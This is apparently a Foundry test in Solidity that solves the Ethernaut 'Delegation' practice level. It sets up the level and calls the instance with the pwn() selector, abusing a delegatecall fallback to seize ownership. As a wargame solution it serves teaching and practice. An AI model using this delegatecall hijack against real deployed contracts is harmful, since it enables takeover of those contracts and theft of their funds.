
pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { Delegation } from "src/Delegation/Delegation.sol";
import { DelegationFactory } from "src/Delegation/DelegationFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";

contract DelegationTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");
    
    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testDelegationHack() external {
        // level setup
        DelegationFactory factory = new DelegationFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(me);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Delegation delegation = Delegation(payable(levelAddress));

        // attack
        address(delegation).call(abi.encodeWithSignature("pwn()"));
        
        // submission
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}

